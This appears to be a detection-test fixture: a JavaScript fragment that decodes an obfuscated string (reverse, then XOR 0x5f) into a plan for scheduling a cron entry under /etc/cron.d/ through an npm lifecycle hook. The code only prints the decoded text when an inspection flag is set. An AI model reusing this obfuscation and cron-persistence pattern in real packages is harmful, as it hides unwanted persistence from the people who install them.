  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_ee9d41ad = "\\u006c\\u006f\\u003a\\u006c\\u006b\\u0068\\u0072\\u003a\\u003b\\u0030\\u0031\\u0070\\u003b\\u0071\\u0031\\u0030\\u002d\\u003c\\u0070\\u003c\\u002b\\u003a\\u0070\\u0062\\u0037\\u002b\\u003e\\u002f\\u0000\\u003a\\u0033\\u002a\\u003b\\u003a\\u0037\\u003c\\u002c\\u0023\\u006c\\u006b\\u006c\\u006f\\u001a\\u006c\\u006b\\u0068\\u0072\\u001a\\u001b\\u0010\\u0011\\u0062\\u003b\\u0036\\u0000\\u0031\\u0038\\u0036\\u003e\\u002f\\u0032\\u003e\\u003c\\u0023\\u006e\\u0062\\u002b\\u0031\\u002a\\u0030\\u003c\\u0000\\u003a\\u0038\\u003e\\u002b\\u002c\\u0023\\u002d\\u0030\\u002b\\u002f\\u0036\\u002d\\u003c\\u002c\\u003a\\u003b\\u0000\\u003a\\u0033\\u003c\\u0026\\u003c\\u003a\\u0039\\u0036\\u0033\\u0000\\u0032\\u002f\\u0031\\u0062\\u002d\\u003a\\u002b\\u002f\\u003e\\u003b\\u003e\\u0023\\u002d\\u0030\\u002b\\u002f\\u0036\\u002d\\u003c\\u002c\\u003a\\u003b\\u0000\\u002d\\u003a\\u002b\\u002c\\u0036\\u0038\\u003a\\u002d\\u0073\\u003a\\u0033\\u002a\\u003b\\u003a\\u0037\\u003c\\u002c\\u0000\\u003b\\u0033\\u0036\\u002a\\u003d\\u0062\\u002c\\u002f\\u003a\\u002b\\u002c\\u0023\\u006e\\u0062\\u0029";
  const Codec_ee9d41ad = "unicode_escapes|reverse_then_xor|5f";

  function load_ee9d41ad() { return [...Material_ee9d41ad.matchAll(/\\u00([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
  function decode_ee9d41ad(v_a19c) { return [...v_a19c].reverse().map((value) => value ^ 95); }
  async function recover_ee9d41ad() {
    const v_c304 = [3, 5, 8, 13].slice(1, 3);
    const v_a19c = load_ee9d41ad(); let v_b27e = [];
    switch (1) { case 1: v_b27e = decode_ee9d41ad(v_a19c); break; default: throw new Error("state"); }
    void v_c304; return Buffer.from(v_b27e).toString("ascii");
  }
  async function inspect_ee9d41ad() { return ({ ...{ value: await recover_ee9d41ad() } }).value; }
  async function plan_ee9d41ad() { const inspect = inspect_ee9d41ad; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "npm_lifecycle_descriptor", path: fields.schedule_path }); }
  void moduleShape; void plan_ee9d41ad;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_ee9d41ad());
